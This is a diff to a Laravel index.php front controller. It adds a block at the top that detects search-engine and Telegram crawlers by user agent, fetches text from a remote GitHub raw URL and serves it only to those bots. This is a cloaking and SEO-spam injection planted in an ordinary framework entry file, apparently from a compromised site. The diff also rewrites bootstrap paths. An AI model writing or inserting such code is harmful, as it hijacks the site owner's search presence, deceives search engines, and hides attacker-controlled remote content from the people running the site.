@@ -1,4 +1,24 @@
 <?php
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
+    
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+    
+    return false;
+}
+
+if (is_bot()) {
+    $message = file_get_contents('https://raw.githubusercontent.com/yugoprakoso157/D/main/zimny.com.pl.txt');
+    echo $message;
+exit; // Atau bisa menggunakan die()
+}
+?>
+<?php
 
 /**
  * Laravel - A PHP Framework For Web Artisans
@@ -6,8 +26,6 @@
  * @package  Laravel
  * @author   Taylor Otwell <taylor@laravel.com>
  */
-
-define('LARAVEL_START', microtime(true));
 
 /*
 |--------------------------------------------------------------------------
@@ -21,7 +39,7 @@ define('LARAVEL_START', microtime(true));
 |
 */
 
-require __DIR__.'/vendor/autoload.php';
+require __DIR__.'/../bootstrap/autoload.php';
 
 /*
 |--------------------------------------------------------------------------
@@ -35,7 +53,7 @@ require __DIR__.'/vendor/autoload.php';
 |
 */
 
-$app = require_once __DIR__.'/bootstrap/app.php';
+$app = require_once __DIR__.'/../bootstrap/app.php';
 
 /*
 |--------------------------------------------------------------------------
@@ -57,4 +75,4 @@ $response = $kernel->handle(
 
 $response->send();
 
-$kernel->terminate($request, $response);
+$kernel->terminate($request, $response);?>
